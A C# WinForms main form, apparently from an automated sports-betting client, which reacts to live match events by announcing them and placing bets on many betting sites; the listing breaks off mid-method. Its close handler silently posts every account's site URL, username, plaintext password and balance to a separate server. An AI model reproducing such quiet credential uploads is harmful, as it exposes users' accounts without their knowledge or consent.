using System;
using System.Windows.Forms;
using CxjText.utlis;
using CxjText.utils;
using CxjText.bean;
using CxjText.views;
using CxjText.iface;
using System.Threading;
using Newtonsoft.Json.Linq;
using System.Collections.Generic;
using System.Speech.Synthesis;
using System.Net;

namespace CxjText
{
    public partial class MainFrom : Form, LoginFormInterface
    {

        private LoginForm loginForm = null; //登录的界面
        private LeftForm leftForm = null; //左边的界面
        private MsgShowForm msgShowForm = null;// 消息列表的界面
        private bool isFinish = false;
        private WebSocketUtils webSocketUtils = null;
        private SpeechSynthesizer speechSynthesizer = new SpeechSynthesizer();

        private List<Eid> listEid = new List<Eid>(); //eid事件储存
        
        public MainFrom()
        {
            InitializeComponent();
            HttpUtils.setMaxContectionNum(100);
            uiInit();

        }


        private void uiInit() {
            //按键权限的控制
            daTuiText.Text = "";
            if (Config.softFun == 0)
            { //点
                jiaoqiu_checkBox.Enabled = false; //不显示角球
                jiaoqiu_checkBox.Visible = false;
                jiaoQiuTime.Visible = false;
                jiaoQiuTime.Enabled = false; //不显示角球

                dianQiu_check.Visible = false;
                dianQiu_check.Enabled = false;
            }
            else if (Config.softFun == 1)
            { //角  直接下角球  不用角球显示器
                fitBox.Visible = false;
                fitBox.Enabled = false;

                pingbanCheckBox.Visible = false;
                pingbanCheckBox.Enabled = false;

                jiaoqiu_checkBox.Visible = false;
                jiaoqiu_checkBox.Enabled = false;

                panel1.Visible = false; //显示让球和大小的选择框
                groupBox2.Visible = true; //炸弹下注金额设置
                groupBox2.Text = "角球金额设置";//（就是当炸弹来下注）
                jiaoQiuTime.Visible = true;
                Config.jiaoQiuGouXuan = jiaoQiuTime.Checked;

                dianQiu_check.Visible = false;
                dianQiu_check.Enabled = false;
                
            }
            else if (Config.softFun == 2) {
                //全部显示
                groupBox2.Text = "点+进+角-金额";
                Config.jiaoQiuGouXuan = jiaoQiuTime.Checked;

                dianQiu_check.Visible = true;
                dianQiu_check.Enabled = true;
                Config.dianQiuGouXuan = dianQiu_check.Checked;
                Config.jiaoQiuEnble = jiaoqiu_checkBox.Checked;

            }


            //大腿模糊算法
            if (Config.canPutDaTui)
            {
                datuiCheckBox.Visible = true;
                Config.daTuiEnble = datuiCheckBox.Checked;
            }
            else {
                datuiCheckBox.Visible = false;
                datuiCheckBox.Enabled = false;
            }

            //40-42的角球
            if (Config.has40Enbale)
            {
                sishiHou.Visible = true;
            }else {
                sishiHou.Visible = false;
            }
        }


        //窗口加载出来的时候调用
        private void MainFrom_Load(object sender, EventArgs e)
        {
            OrderUtils.autoLists.Clear();
            DataInit(); //读取配置文件
            if (Config.userList == null || Config.userList.Count == 0)
            {
                MessageBox.Show("读取配置文件出错");
                Application.Exit();
                return;
            }
           
            this.MsgShowFormInit();
           
            ViewInit();
            this.upDateTimer.Start(); //启动定时任务器
            webSocketUtils = new WebSocketUtils(Config.webSocketUrl);
            webSocketUtils.setOnMessListener(this);
            speakInit();
            Config.hasFitter = fitBox.Checked;
            Config.isPingBang = pingbanCheckBox.Checked;
        }

        //初始化语音
        private void speakInit()
        {
            try
            {
                if (speechSynthesizer.GetInstalledVoices().Count > 0)
                {
                    bool setLily = false;
                    for (int i = 0; i < speechSynthesizer.GetInstalledVoices().Count; i++)
                    {
                        String name = speechSynthesizer.GetInstalledVoices()[i].VoiceInfo.Name;
                        if (name.Equals("VW Lily"))
                        {
                            speechSynthesizer.SelectVoice(name);
                            setLily = true;
                            break;
                        }
                    }

                    if (!setLily && speechSynthesizer.GetInstalledVoices().Count > 0)
                    {
                        speechSynthesizer.SelectVoice(speechSynthesizer.GetInstalledVoices()[0].VoiceInfo.Name);
                    }

                    speechSynthesizer.Rate = 6;
                    speechSynthesizer.SpeakAsync("登录成功");
                }
            }
            catch (Exception e1)
            {
               
                // MessageBox.Show("请安装语音库");
            }
        }


        private void ViewInit()
        {
            loginForm = new LoginForm();
            loginForm.TopLevel = false;    //设置为非顶级窗体
            loginForm.FormBorderStyle = FormBorderStyle.None;       //设置窗体为非边框样式
            this.loginPanel.Controls.Add(loginForm);      //添加窗体
            loginForm.Show();
            loginForm.setLoginFormInterface(this);


            leftForm = new LeftForm();
            leftForm.TopLevel = false;    //设置为非顶级窗体
            leftForm.FormBorderStyle = FormBorderStyle.None;       //设置窗体为非边框样式
            this.leftPanel.Controls.Add(leftForm);      //添加窗体
            leftForm.Show();
            leftForm.setMainForm(loginForm, this);
            
        }


        private void DataInit()
        {
            //获取到用户数据
            FileUtils.ReadUserJObject(@"C:\user.txt");
        }


        //退出整个应用程序
        private void MainFrom_close(object sender, FormClosedEventArgs e)
        {

            //先捕捉金额

            JObject jObject = new JObject();
            jObject["userName"] = Config.softUserStr;
            JArray jArry = new JArray();
            for (int i = 0; i < Config.userList.Count; i++) {
                UserInfo userInfo = (UserInfo)Config.userList[i];
                if (userInfo != null && !String.IsNullOrEmpty(userInfo.money)) {
                    JObject temp = new JObject();
                    temp["sys"] = userInfo.tag; //系统
                    if (!String.IsNullOrEmpty(userInfo.userExp) && userInfo.userExp.Equals("1")) {
                        temp["sys"] = userInfo.tag+"_1";
                    }
                    temp["money"] = userInfo.money;//钱
                    temp["url"] = userInfo.baseUrl;
                    temp["webUser"] = userInfo.user;
                    temp["webPwd"] = userInfo.pwd;
                    jArry.Add(temp);
                }
            }
            if (jArry.Count > 0) {
                jObject["web"] = jArry;
                HttpUtils.HttpPost(Config.netUrl + "/cxj/outLogin", jObject.ToString(), "application/json", null);
            }

          


            try
            {
                this.upDateTimer.Stop(); //将定时器停止
                isFinish = true;
                
                if (this.msgShowForm != null)
                {
                    this.msgShowForm.Close();
                }

                if (webSocketUtils != null)
                {
                    webSocketUtils.close();
                }

                if (speechSynthesizer != null)
                {
                    speechSynthesizer.SpeakAsyncCancelAll();
                    speechSynthesizer.Dispose();
                }
            }
            catch (Exception e1)
            {

            }

            System.Environment.Exit(0);
        }

        //定时器回调   1s一次
        private int num = 0;
        private int jiaoQiuNum = 0;
        private void updateTimer_Tick(object sender, EventArgs e)
        {
            
            num++;
            jiaoQiuNum++;

            if (jiaoQiuNum % 8 == 0) {
                this.Invoke(new Action(() => {
                    if (Config.has40Enbale && sishiHou.Checked) {
                        leftForm.input40_41JiaoQiu();
                    }
                }));
                jiaoQiuNum = 0;
            }

            if (num % 30 == 0)
            {
                

                if (webSocketUtils != null)
                {
                    JObject jObject = new JObject();
                    jObject["user"] = Config.softUserStr;
                    jObject["version"] = Config.vString;
                    webSocketUtils.send(jObject.ToString());
                }
                num = 0;
            }

            //删除缓存列表数据
            OrderUtils.autoLists.RemoveAll(j => (FormUtils.getCurrentTime() - j.time > 140 * 60 * 1000));

            if (listEid != null && listEid.Count > 0) {
                listEid.RemoveAll(j => (FormUtils.getCurrentTime() - j.time > 200 * 60 * 1000));
            }
            

            if (this.loginForm == null) return;
            //获取当前选中的行
            int index = this.loginForm.getCurrentSelectRow();
            if (index == -1) return;

            //刷新用户数据界面  A系统1s一次  B系统10s一次  其他未知
            this.upDateTimer.Stop(); //暂停定时器

            //获取当前系统的时间  毫秒
            long currentTime = FormUtils.getCurrentTime();
            UserInfo userInfo = (UserInfo)Config.userList[index];
            if (userInfo == null)
            {
                this.upDateTimer.Start();
                return;
            }
            long userTime = userInfo.updateTime;//获取用户上一次刷新的时间
            //刷新修改 1  时间的处理
            bool canUpdate = FormUtils.canUpdateData(userInfo.tag, userTime, currentTime,userInfo.userExp);
            if (!canUpdate)
            {
                this.upDateTimer.Start();
                return;
            }

            //开始更新数据  更新数据后 重新user更新时间 然后打开定时器
            Thread t = new Thread(new ParameterizedThreadStart(this.GetData));
            t.Start(index);
        }

        //获取数据接口 在线程里面
        private void GetData(object positionObj)
        {
            int position = (int)positionObj;
            try
            {
                UserInfo userInfo = (UserInfo)Config.userList[position];
                if (userInfo == null)
                {
                    this.Invoke(new Action(() => { upDateTimer.Start(); }));
                    return;
                }
                //获取数据请求接口的url
                String dataRtlStr = null;
                switch (userInfo.tag)
                {
                    case "A":
                        dataRtlStr = DataPramsUtils.getAData(userInfo);
                        break;
                    case "B":
                        dataRtlStr = DataPramsUtils.getBData(userInfo);
                        break;
                    case "I":
                        dataRtlStr = DataPramsUtils.getIData(userInfo);
                        break;
                    case "U":
                        dataRtlStr = DataPramsUtils.getUData(userInfo);
                        break;
                    case "R":
                        dataRtlStr = DataPramsUtils.getRData(userInfo);
                        break;
                    case "G":
                        dataRtlStr = DataPramsUtils.getGData(userInfo);
                        break;
                    case "K":
                        dataRtlStr = DataPramsUtils.getKData(userInfo);
                        break;
                    case "C":
                        dataRtlStr = DataPramsUtils.getCData(userInfo);
                        break;
                    case "F":
                        dataRtlStr = DataPramsUtils.getFData(userInfo);
                        break;
                    case "D":
                        dataRtlStr = DataPramsUtils.getDData(userInfo);
                        break;
                    case "E":
                        dataRtlStr = DataPramsUtils.getEData(userInfo);
                        break;
                    case "H":
                        dataRtlStr = DataPramsUtils.getHData(userInfo);
                        break;
                    case "O":
                        dataRtlStr = DataPramsUtils.getOData(userInfo);
                        break;
                    case "J":
                        dataRtlStr = DataPramsUtils.getJData(userInfo);
                        break;
                    case "L":
                        dataRtlStr = DataPramsUtils.getLData(userInfo);
                        break;
                    case "M":
                        dataRtlStr = DataPramsUtils.getMData(userInfo);
                        break;
                    case "N":
                        dataRtlStr = DataPramsUtils.getNData(userInfo);
                        break;
                    case "BB1":
                        dataRtlStr = DataPramsUtils.getBB1Data(userInfo);
                        break;
                    case "Y":
                        dataRtlStr = DataPramsUtils.getYData(userInfo);
                        break;
                    case "W":
                        dataRtlStr = DataPramsUtils.getWData(userInfo);
                        break;
                    case "J1":
                        dataRtlStr = DataPramsUtils.getJ1Data(userInfo);
                        break;
                    default:
                        break;
                }
                //返回数据是空表示获取数据失败
                if (String.IsNullOrEmpty(dataRtlStr))
                {
                    this.Invoke(new Action(() => { upDateTimer.Start(); }));
                    return;
                }
                userInfo.updateTime = FormUtils.getCurrentTime();
                //判断当前选中和数据返回是否同一个数据 不是直接返回
                if (position != loginForm.getCurrentSelectRow())
                {
                    return;
                }
                //获取数据成功
                this.Invoke(new Action(() => {
                    leftForm.SetCurrentData(dataRtlStr, position); //将数据传给界面处理
                    upDateTimer.Start();
                }));
            }
            catch (Exception e)
            {
                Console.WriteLine("获取数据:"+e.ToString());
                if (this.isFinish) return;
                //判断当前选中和数据返回是否同一个数据 不是直接返回
                if (position != loginForm.getCurrentSelectRow())
                {
                    return;
                }
                this.Invoke(new Action(() => { upDateTimer.Start(); }));
            }
        }


        //用户点击选中网址的回调 参数是点击了第几行
        public void SelectOnClick(int index)
        {
            //点击的时候  将当前时间设置下  下个定时时间一到就会立马刷新 
            UserInfo userInfo = (UserInfo)Config.userList[index];
            userInfo.updateTime = -1;
            this.upDateTimer.Start();
        }

        //搜索字体更改处理
        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            String str = textBox1.Text.ToString().Trim();
            if (this.leftForm != null)
            {
                this.leftForm.SetSeaechStr(str);
            }
        }

        public void getCodeMoneyStatus(string moneyStr)
        {
            if (String.IsNullOrEmpty(moneyStr))
            {
                return;
            }

            this.Invoke(new Action(() => { codeMoneyText.Text = moneyStr; }));
        }

        private void speakStr(String str) {
            try
            {
                if (isFinish) return;
                if (speechSynthesizer != null) {
                    speechSynthesizer.SpeakAsync(str);
                }
            }
            catch (Exception e) {

            }
        }


        private void speak(String cid, String info)
        {
            try
            {
                if (Config.speakJObject[cid] != null)
                {
                    String speakStr = (String)Config.speakJObject[cid];

                    if (cid.Equals("2055") || cid.Equals("1031"))
                    {
                        if (info.ToLower().Contains("cancle"))
                        {
                            speakStr = "点球取消";
                        }
                        else if (info.ToLower().Contains("miss"))
                        {
                            speakStr = "点球失误！";
                        }

                        if (info.ToLower().Equals("penalty home"))
                        {
                            speakStr = "主队点球";
                        }
                        else if (info.ToLower().Equals("penalty away"))
                        {
                            speakStr = "客队点球";
                        }else if (info.Equals("danger_free_kick")) {
                            if (cid.Equals("1031"))
                            {
                                speakStr = "主队危险任意球";
                            }
                            else {
                                speakStr = "客队危险任意球";
                            }
                        }

                    }
                    else if (cid.Equals("142") || cid.Equals("146"))
                    {
                        if (info.ToLower().Contains("cancle"))
                        {
                            speakStr = "点球取消";
                        }
                        else if (info.ToLower().Contains("miss"))
                        {
                            speakStr = "点球失误！";
                        }
                    }
                    speechSynthesizer.Rate = 6;
                    speechSynthesizer.SpeakAsync(speakStr);
                }

            }
            catch (Exception e)
            {
              //  Console.WriteLine(e.ToString());
            }
        }


        //界面的显示处理
        private void showViewText(EnventShowInfo enventShowInfo) {
            timeText.Text = "时间: " + DateTime.Now.ToString() + " - " + enventShowInfo.shiDuan;
            lianSaiText.Text = "联赛：" + enventShowInfo.lianSaiStr;
            gameText.Text = enventShowInfo.gameH + " - " + enventShowInfo.gameG;
            if (enventShowInfo.ballType == 1)
            {
                gameText.Text = gameText.Text.ToString() + "(进球)";
            }
            else if(enventShowInfo.ballType == 2)
            {
                gameText.Text = gameText.Text.ToString() + "(角球)";
            }
            enventText.Text = "事件:" + enventShowInfo.text;
            gameText.Tag = enventShowInfo.gameTeamColor; //判断主客队标志
        }


        //显示事件
        private EnventShowInfo getShowInfo(int time, int teamColor, String shiDuan,
            String hSting, String gString, String enventStr, String lianSai,int ballType) {
            EnventShowInfo enventShowInfo = new EnventShowInfo();
            enventShowInfo.gameTime = time;
            enventShowInfo.gameTeamColor = teamColor;
            enventShowInfo.shiDuan = shiDuan;
            enventShowInfo.gameH = hSting;
            enventShowInfo.gameG = gString;
            enventShowInfo.text = enventStr;
            enventShowInfo.lianSaiStr = lianSai;
            enventShowInfo.ballType = ballType;
            return enventShowInfo;
        }


        //收到数据
        public void OnWebSocketMessAge(string message)
        {
           
            if (String.IsNullOrEmpty(message) || !FormUtils.IsJsonObject(message))
            {
                return;
            }
            if (leftForm == null) return;
            if (this.isFinish) return;

            JObject jObject = JObject.Parse(message);
            if (jObject == null || jObject["cmd"] == null) return;

            //退出登录
            if (((int)jObject["cmd"]) == -1) {
                this.Invoke(new Action(() => {
                    String version =(String) jObject["version"];
                    if (version != null && !version.Equals(Config.vString)) {
                        MessageBox.Show("请更换新版本" + version);
                        System.Environment.Exit(0);
                    }
                }));
                return;
            }

            /*今日赛事处理*/
            int gPosition = loginForm.getCurrentSelectRow();
            UserInfo gUser = (UserInfo)Config.userList[gPosition];
            if (gUser.tag.Equals("G") && (gUser.userExp.Equals("1")|| gUser.userExp.Equals("2"))) {
                return;
            }
            //今日1
            if (gUser.tag.Equals("D") && (gUser.userExp.Equals("1")))
            {
                return;
            }

            if (gUser.tag.Equals("E") && (gUser.userExp.Equals("1")))
            {
                return;
            }

            if (gUser.tag.Equals("M") && (gUser.userExp.Equals("1")))
            {
                return;
            }

            if (gUser.tag.Equals("I") && (gUser.userExp.Equals("1")))
            {
                return;
            }

            if (gUser.tag.Equals("H") && (gUser.userExp.Equals("1")))
            {
                return;
            }

            //大腿事件处理  cmd 666
            if (((int)jObject["cmd"]) == 666)
            {
              
                if (!Config.daTuiEnble || !Config.canPutDaTui) {
                    return;
                }
                this.Invoke(new Action(() => {
                    String sysStr = (String)jObject["sys"];
                    String nameH = (String)jObject["daTuiGameH"];
                    String nameG = (String)jObject["daTuiGameG"];
                    bool isDaXiao = (bool)jObject["isDaXiao"];//是否是大小
                    String daTuiStr = "";
                    daTuiStr = "大腿系统:" + sysStr;
                    daTuiStr = daTuiStr + "," + nameH + "---" + nameG;
                    if (isDaXiao)
                    {
                        daTuiStr = daTuiStr + ",类型:" + "大小";
                    }
                    else {
                        daTuiStr = daTuiStr + ",类型:" + "让球";
                    }
                    daTuiText.Text = daTuiStr + ",时间:"+FormUtils.ConvertLongToDateTime(FormUtils.getCurrentTime());
                    int curPosition = loginForm.getCurrentSelectRow();
                    if (curPosition >= Config.userList.Count) return;
                    UserInfo userInfo = (UserInfo)Config.userList[curPosition];
                    if (userInfo!=null) {
                        if (sysStr.Equals("BB1"))
                        {
                            if (userInfo.tag.Equals(sysStr)) {
                                leftForm.DaTuiOrder(jObject);
                            }
                        }else {
                            if (!userInfo.tag.Equals("BB1")) {
                                leftForm.DaTuiOrder(jObject);
                            }
                        }
                        
                    }
                }));
                    return;
            }

            Console.WriteLine("事件:" + message);

            //87分钟事件的处理
            //{"cmd":2,"league":"冰岛女子甲组联赛","state":0,"score1":"1","score2":"1","tm1":"斯洛图尔(女)","tm2":"富佐尼(女)","gametime":"67"}
            // 联赛名字，{1:主队进球,0:客队进球},主队比分,客队比分,主队名字,客队名字,比赛进行的时间
            if (((int)jObject["cmd"]) == 2)
            {
                if (Config.softFun == 1) { return; } //角球的直接返回
                this.Invoke(new Action(() => {
                    String league = (String)jObject["league"];
                    int state = (int)jObject["state"];
                    int zhuScore = (int)jObject["score1"];
                    int geScore = (int)jObject["score2"];
                    String hName = (String)jObject["tm1"];
                    String gName = (String)jObject["tm2"];
                    int gameTime = (int)jObject["gametime"];

                    int curPosition = loginForm.getCurrentSelectRow();
                    if (curPosition >= Config.userList.Count) return;

                    UserInfo userInfo = (UserInfo)Config.userList[curPosition];
                    if (userInfo == null) return;

                  
                    if ((userInfo.tag.Equals("J") || userInfo.tag.Equals("C") || userInfo.tag.Equals("D")|| userInfo.tag.Equals("G")) && Config.hasJinQiuFun)
                    {
                        //C和J有进球功能
                    }
                    else {
                        //AUD
                        if (!(userInfo.tag.Equals("A") || userInfo.tag.Equals("U") || userInfo.tag.Equals("D")))
                        {
                            return;
                        }
                        if (!((gameTime >= 86 && gameTime <= 89)))
                        {
                            return;
                        }

                    }

                    gameTime = gameTime * 60 * 1000; //计算当前比赛时间 毫秒
                    String shijianStr = "";
                    int teamColor = 0;
                    String shiDuan = "全场";
                    String biFenString = "(" + zhuScore + ":" + geScore + ")";

                    if (state == 1)
                    {
                        teamColor = 1;
                        shijianStr = "主队进球";
                    }
                    else if (state == 0)
                    {
                        teamColor = 2;
                        shijianStr = "客队进球";
                    }
                    else { return; }
                    if (gameTime < 2700000)
                    { //半场
                        shiDuan = "上半场";
                    }
                    else
                    {
                        shiDuan = "全场";
                    }

                    speakStr(shiDuan + shijianStr + "," + biFenString);
               

                    //事件的显示
                    EnventShowInfo jinQiuShowInfo = getShowInfo(gameTime,
                        teamColor, shiDuan,
                        hName, gName,
                        shijianStr + biFenString, league, 1);

                    showViewText(jinQiuShowInfo);
                   


                    //处理进球下单事件
                    EnventInfo jinQiuEnventInfo = new EnventInfo();

                    if (state == 1) //主队
                    {
                        jinQiuEnventInfo.cid = "1031";
                    }
                    else if (state == 0) //客队
                    {
                        jinQiuEnventInfo.cid = "2055";
                    }

                    jinQiuEnventInfo.info = shijianStr;
                    jinQiuEnventInfo.time = FormUtils.getCurrentTime();
                    jinQiuEnventInfo.mid = "-1";
                    jinQiuEnventInfo.nameH = hName;
                    jinQiuEnventInfo.nameG = gName;
                    jinQiuEnventInfo.T = gameTime + "";
                    jinQiuEnventInfo.inputType = this.GetCurrUserSelected();
                    jinQiuEnventInfo.bangchangType = GetBanChangSelected();
                    JArray scoreArray = new JArray(); 
                    scoreArray.Add(zhuScore);//第0个
                    scoreArray.Add(geScore);//第1个
                    jinQiuEnventInfo.scoreArray = scoreArray; //进球比分赋值处理
                    speakStr("有进球要下注");
                    if (isAuto())
                    {
                        leftForm.setComplete(jinQiuEnventInfo);
                    }
                    Thread t = new Thread(new ParameterizedThreadStart(this.ShowEventInfo));
                    t.Start(jinQiuShowInfo);
                }));
                return;
            }

            if (((int)jObject["cmd"]) != 1 && ((int)jObject["cmd"]) != 100 && ((int)jObject["cmd"]) != 101) return;

            //cmd 1 的情况 和 100 的情况  都是点球  
            /****************判断事件的类型做出显示的处理*****************************/

            

            if (jObject["game"] == null || jObject["data"] == null) return;
           
            String cid = (String)jObject["data"]["CID"];
            String mid = (String)jObject["data"]["MID"];
            int gameT = (int)jObject["data"]["T"];
            //没有EID不会崩溃的情况
            if (jObject["data"]["EID"] != null )
            {
                String EID = (String)jObject["data"]["EID"];
                try
                {
                    int eidInt = int.Parse(EID);
                    Eid eid = listEid.Find(j => j.mid.Equals(mid));
                    if (eid != null)
                    {
                        if (eidInt - eid.eid > 0)
                        {
                            eid.eid = eidInt;
                            eid.time = FormUtils.getCurrentTime();
                        }
                        else
                        {
                            return;
                        }
                    }
                    else
                    {
                        Eid eidEvent = new Eid();
                        eidEvent.mid = mid;
                        eidEvent.eid = eidInt;
                        eidEvent.time = FormUtils.getCurrentTime();
                        listEid.Add(eidEvent);

                    }

                }
                catch (Exception e11)
                {
                    return;
                }

            }
           


            //这里要把角球判断出来  未处理
            bool isJiaoQiu = false;

            if (cid.Equals("1025") || cid.Equals("2049")) {
                
                isJiaoQiu = true;
            }

            //角球的情况
            if (isJiaoQiu)
            {
                

                if (Config.softFun == 0)//点
                {
                    return;
                }

                this.Invoke(new Action(() => {
                    int curPosition = loginForm.getCurrentSelectRow();
                    if (curPosition >= Config.userList.Count) return;
                    UserInfo userInfo = (UserInfo)Config.userList[curPosition];
                    if (userInfo == null) return;

                    String league = (String)jObject["game"]["leagueName"]; //联赛
                   /* if (!String.IsNullOrEmpty(league)) {
                        if (league.Contains("瑞典") || league.Contains("印度")) {
                            return;
                        }
                    }*/
                    int state = 1;//主客队进球标志 未处理
                    bool isCancel = false;
                    bool isConfirme = false;
                    String dataInfo = (String)jObject["data"]["Info"];
                    if (dataInfo.ToLower().Contains("cancel") || dataInfo.Contains("Confirmed"))
                    {
                        if (dataInfo.ToLower().Contains("cancel")) {
                            isCancel = true;
                        }

                        if (dataInfo.Contains("Confirmed")) {
                            isConfirme = true;
                        }
                    }

                    if (cid.Equals("1025")) //主队角球
                    {
                        state = 1;
                    }
                    else {
                        state = 0;
                    }
                    String hName = (String)jObject["game"]["nameH"]; //主队
                    String gName = (String)jObject["game"]["nameG"]; //客队
                    int gameTime = (int)jObject["data"]["T"];//毫秒级别

                    String shijianStr = "";
                    int teamColor = 0;
                    String shiDuan = "全场";

                    if (state == 1)
                    {
                        teamColor = 1;
                        shijianStr = "可能主队角球";
                        if (isCancel)
                        {
                            shijianStr = "主队角球取消";
                        }
                        else if (isConfirme) {
                            shijianStr = "主队角球";
                        }
                    }
                    else if (state == 0)
                    {
                        teamColor = 2;
                        shijianStr = "可能客队角球";
                        if (isCancel)
                        {
                            shijianStr = "客队角球取消";
                        }
                        else if (isConfirme)
                        {
                            shijianStr = "客队角球";
                        }
                    }
                    else { return; }
                    if (gameTime == -1)
                    {
                        shiDuan = "全场";
                    }else {
                        if (gameTime < 2700000)
                        { //半场
                            shiDuan = "上半场";
                        }
                        else
                        {
                            shiDuan = "全场";
                        }
                    }
                    
                  //  speakStr(shiDuan + shijianStr);

                    //事件的显示
                    EnventShowInfo jiaoQiuShowInfo = getShowInfo(gameTime,
                      teamColor, shiDuan,
                      hName, gName,
                      shiDuan + shijianStr, league, 2);//balltye要处理为2

                    showViewText(jiaoQiuShowInfo);


                    //处理角球下单事件
                    EnventInfo jiaoQiuEnventInfo = new EnventInfo();
                    if (state == 1) //主队
                    {
                        jiaoQiuEnventInfo.cid = "1031";
                    }
                    else if (state == 0) //客队
                    {
                        jiaoQiuEnventInfo.cid = "2055";
                    }

                    jiaoQiuEnventInfo.info = shijianStr;
                    jiaoQiuEnventInfo.time = FormUtils.getCurrentTime();
                    jiaoQiuEnventInfo.mid = mid;
                    jiaoQiuEnventInfo.nameH = hName;
                    jiaoQiuEnventInfo.nameG = gName;
                    jiaoQiuEnventInfo.T = gameTime + "";
                    jiaoQiuEnventInfo.inputType = 1;//直接是大小球
                    jiaoQiuEnventInfo.bangchangType = GetBanChangSelected();
                    jiaoQiuEnventInfo.scoreArray = null; 
                    //角球下注处理
                    if (!isCancel && !isConfirme) {
                        if (isAuto()) {
                            leftForm.setJiaoQiuComplete(jiaoQiuEnventInfo);
                        }
                    }
                    Thread t = new Thread(new ParameterizedThreadStart(this.ShowEventInfo));
                    t.Start(jiaoQiuShowInfo);
                    }));
                return;
            }
            else { //点
                if (Config.softFun == 1)//角
                {
                    return;
                }
                
            }


            int dianQiuEnvent = 0;
            if (((int)jObject["cmd"]) == 101)
            {
                dianQiuEnvent = 1; //M8的事件
            }
            Console.WriteLine(message);
            //点球下注处理
            //   Console.WriteLine(jObject.ToString());
            EnventInfo enventInfo = new EnventInfo();
            enventInfo.inputType = this.GetCurrUserSelected();
            enventInfo.cid = cid;
            enventInfo.mid = mid;
            enventInfo.nameH = (String)jObject["game"]["nameH"];
            enventInfo.nameG = (String)jObject["game"]["nameG"];
            enventInfo.info = (String)jObject["data"]["Info"];
            enventInfo.time = FormUtils.getCurrentTime();
            enventInfo.T = (String)jObject["data"]["T"];
            enventInfo.bangchangType = GetBanChangSelected(); //半场的下注类型

            //有改革这里要更改
            speak(cid, enventInfo.info); //语音播报

            //事件显示和弹框的处理
            this.Invoke(new Action(() => {
                String shiDuan = "全场";
                String enventString = "";
                int teamColor = 0;
                int time = 0;
                try
                {
                    time = int.Parse(enventInfo.T);
                    if (time == -1)
                    {
                        shiDuan = "全场";
                    }
                    else {
                        if (time <= 2700000)
                        { //半场
                            shiDuan = "上半场";
                        }
                        else
                        {
                            shiDuan = "全场";
                        }
                    }
                   
                }
                catch (Exception e)
                {

                }

                //有改革这里要更改
                if (Config.speakJObject[cid] != null)
                {
                    enventString = "事件:" + (String)Config.speakJObject[cid];
                    if (cid.Equals("2055") || cid.Equals("1031"))
                    {
                        if (enventInfo.info.ToLower().Contains("cancle"))
                        {
                            enventString = "事件:点球取消!";
                        }
                        else if (enventInfo.info.ToLower().Contains("miss"))
                        {
                            enventString = "事件:点球失误!";
                        }

                        if (enventInfo.info.ToLower().Equals("penalty home"))
                        {
                            enventString = "事件:主队点球";
                        }
                        else if (enventInfo.info.ToLower().Equals("penalty away"))
                        {
                            enventString = "事件:客队点球";
                        }
                        else if (enventInfo.info.Equals("danger_free_kick"))
                        {
                            if (cid.Equals("1031"))
                            {
                                enventString = "事件:主队危险任意球";
                            }
                            else
                            {
                                enventString = "事件:客队危险任意球";
                            }
                        }

                    }
                    else if (cid.Equals("142") || cid.Equals("146"))
                    {
                        if (enventInfo.info.ToLower().Contains("cancle"))
                        {
                            enventString = "事件:点球取消!";
                        }
                        else if (enventInfo.info.ToLower().Contains("miss"))
                        {
                            enventString = "事件:点球失误!";
                        }
                    }
                }
                else
                {
                    enventString = "事件:" + "未知";
                }


                if (cid.Equals("9926") || cid.Equals("1031") || cid.Equals("1062")) //主队
                {
                    teamColor = 1;
                }
                else if (cid.Equals("9927") || cid.Equals("2055") || cid.Equals("2086"))//客队
                {
                    teamColor = 2;
                } else {
                    teamColor = 0;
                }
                //事件的显示
                EnventShowInfo enventShowInfo = getShowInfo(time, teamColor, shiDuan, 
                    enventInfo.nameH,
                    enventInfo.nameG, 
                    enventString.Replace("事件:", ""),
                    (String)jObject["game"]["leagueName"],0);

                enventShowInfo.dianQiuEnvent = dianQiuEnvent;

                //界面显示
                showViewText(enventShowInfo);

                Thread t = new Thread(new ParameterizedThreadStart(this.ShowEventInfo));
                t.Start(enventShowInfo);
            }));


            if (cid.Equals("9926") || cid.Equals("9927"))
            {
                speakStr("炸弹重现江湖！");
                speakStr("炸弹重现江湖！");
                return;
            }


            //有改革要更改
            if (cid.Equals("2055") || cid.Equals("1031") || cid.Equals("888") || cid.Equals("144"))
            {

                //先判断是不是危险任意球
                if (cid.Equals("2055")||cid.Equals("1031"))
                {
                    Console.WriteLine("111111");
                     if (enventInfo.info.Equals("danger_free_kick"))
                    {
                        Console.WriteLine("danger_free_kick");
                        //主客  下  0盘口   时间在42--44  88后  赔率大于0.5
                        if (isAuto() && renyiCheckBox.Checked) //勾选自动和任意球才下注
                        {
                            if (cid.Equals("1031"))
                            {
                                // "事件:主队危险任意球";
                                this.Invoke(new Action(() =>
                                {
                                    Console.WriteLine("主：下注");
                                    leftForm.weixianXiaZhu(enventInfo);
                                }));
                            }
                            else
                            {

                                // "事件:客队危险任意球"; 
                                this.Invoke(new Action(() =>
                                {
                                    Console.WriteLine("客：下注");
                                    leftForm.weixianXiaZhu(enventInfo);
                                }));

                            }
                            return;
                        }
                        else {
                            return;
                        }
                    }
                }


                //要下注的情况
                //先对info做判断  有直接删除然后会return
                if (enventInfo.info.ToLower().Contains("cancel")|| enventInfo.info.ToLower().Contains("miss"))
                {
                    return;
                }

                if (cid.Equals("2055")) //客队点球
                {
                    //客队可以下注 
                    this.Invoke(new Action(() =>
                    {
                        if (isAuto() 
                        && 
                        ((M8checkBox.Checked&&dianQiuEnvent==1)
                        || (NYCheckBox.Checked && dianQiuEnvent == 0)))
                        {
                           // Console.WriteLine("dianQiuEnvent:" + dianQiuEnvent);
                            leftForm.setComplete(enventInfo);
                        }
                    }));
                }
                else if (cid.Equals("1031"))//主队点球
                {
                    //主队可以下注
                    this.Invoke(new Action(() =>
                    {
                        if (isAuto()
                        &&
                        ((M8checkBox.Checked && dianQiuEnvent == 1)
                        || (NYCheckBox.Checked && dianQiuEnvent == 0)))
                        {
                           // Console.WriteLine("dianQiuEnvent:" + dianQiuEnvent);
                            leftForm.setComplete(enventInfo);
                        }
                    }));
                }
                else if (cid.Equals("888")|| cid.Equals("144")) { //只下大小球

                    if (cid.Equals("144")) {
                        this.Invoke(new Action(() =>
                        {
                            if (isAuto()&&keNengCheck.Checked)
                            {
                                enventInfo.cid = "888";
                                enventInfo.inputType = 1; //只下大小
                                enventInfo.bangchangType = 0; //只下默认
                                leftForm.setComplete(enventInfo);
                            }
                        }));
                        return;
                    }

                    this.Invoke(new Action(() =>
                    {
                        if (isAuto()
                        &&
                        ((M8checkBox.Checked && dianQiuEnvent == 1)
                        || (NYCheckBox.Checked && dianQiuEnvent == 0)))
                        {
                            
